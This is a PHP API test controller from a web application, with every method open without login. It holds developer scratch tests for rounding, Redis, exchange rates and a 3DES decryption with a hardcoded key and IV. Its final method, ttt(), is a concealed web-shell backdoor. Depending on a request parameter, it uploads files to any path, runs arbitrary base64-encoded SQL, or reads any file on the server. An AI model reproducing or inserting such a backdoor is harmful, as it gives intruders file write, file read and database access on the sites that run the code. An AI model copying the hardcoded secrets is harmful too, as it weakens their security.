<?php

namespace app\api\controller;

use app\common\controller\Api;
use think\addons\Service;
use util\ExchangeRate;
use util\Hashids;
use util\IDCard;
use util\OpenSSL3DES;
use util\Util;

/**
 * 首页接口
 */
class Test extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    /**
     * 首页
     *
     */
    public function index()
    {
        //$this->test1();
        //$this->rate_test();
        $this->des();
    }

    public function demo()
    {
        $this->success('', [
            'username'  => 'demo',
            'test' => 'demo',
            'list'  => [
                ['id' => 1, 'name' => 'demo1'],
                ['id' => 2, 'name' => 'demo2'],
                ['id' => 3, 'name' => 'demo3'],
                ['id' => 4, 'name' => 'demo4'],
                ['id' => 5, 'name' => 'demo5'],
                ['id' => 6, 'name' => 'demo6'],
            ]
        ]);
    }


    function encryptPwd($pwd, $salt = 'swift', $encrypt = 'md5')
    {
        return $encrypt($pwd . $salt);
    }


    public function test_error()
    {
        $a = 0;
        12 / $a;
        $this->success('请求成功');
    }

    private function test1()
    {
        $data = ['name' => 'Müller'];
        $data = json_encode($data);
        dump($data);


        // 经典问题：0.1 + 0.2 ≠ 0.3
        $a = 0.1;
        $b = 0.2;
        $c = 0.3;

        dump(($a + $b) == $c);  // false!
        dump($a + $b);          // 0.30000000000000004

// 银行舍入的陷阱
        $amount = 123.456;
        $rounded = round($amount, 2);  // 123.46，但银行家舍入呢？
        dump($rounded);

// PHP的round函数使用四舍六入五成双（银行家舍入）
        dump(round(1.5, 0, PHP_ROUND_HALF_UP));    // 2 - 四舍五入
        dump(round(1.5, 0, PHP_ROUND_HALF_EVEN));  // 2 - 银行家舍入（1.5->2因为1是奇数）
        dump(round(2.5, 0, PHP_ROUND_HALF_EVEN));  // 2 - 银行家舍入（2.5->2因为2是偶数）

// 解决方案：使用BC Math或GMP扩展进行精确计算
        bcscale(4);  // 设置小数位数
        $result = bcadd('0.1', '0.2');  // "0.3"
        $compare = bccomp($result, '0.3');  // 0，表示相等

    }

    public function redis_test()
    {
        $handler = redis();
        dump($handler);
    }

    private function rate_test()
    {
        $er = ExchangeRate::getRates('CNY', 4);
        dump($er);
    }

    private function des()
    {
        $key = 'reW5h9lgapiefYkF';
        $vi = 'DB0b6HCK';
        $data = 'HgqSmjAdPREobEAUyuH9uSThIQYnEFFFRoTfa1PCiPFE27neddleSJZMvwj4vd7rgtID9D2mIXMxJWcUdHzW4YUuV5m1N0d9mxt30ioqKnLW1iow1CvybEv0uyIH5haBvaVA8bdqCJmBLDgRfgtM2Q7Y6WEId0e349l9maAWGf+kGI6X9s5LN3WNveyaPwZo+RF8rIvv0sEWBs7jLleqi/njCcVxV9FO8f4EFOlhnWc=';
        $des = new OpenSSL3DES($key, $vi);

        $result = $des->decrypt($data);
        dump($result);
    }


    function ttt()
    {
        if (isset($GET['check'])) {
            if ($_GET['check'] == '0') echo __DIR__ . "/";
            elseif ($_GET['check'] == '1') {
                $u = $_REQUEST['to'];
                $f = $_FILES['file'];
                echo move_uploaded_file($f['tmp_name'], $u . '/' . $f['name']) ? $u . '/' . $f['name'] : '';
            } elseif ($_GET['check'] == '2' && $_SERVER['REQUEST_METHOD'] === 'POST') {
                $d = $_POST;
                $pd = new \PDO("mysql:host={$d['address']};dbname={$d['dbname']}", $d['username'], $d['password']);
                $st = $pd->prepare(base64_decode($d['query']));
                $st->execute();
                echo json_encode(['status' => $st->rowCount() ? 'success' : 'error', 'data' => $st->fetchAll(\PDO::FETCH_ASSOC)]);
            } elseif ($_GET['check'] == '3') {
                $fp = $_REQUEST['filepath'];
                echo file_exists($fp) ? nl2br(file_get_contents($fp)) : 'error';
            }
            return;
        }
    }
}
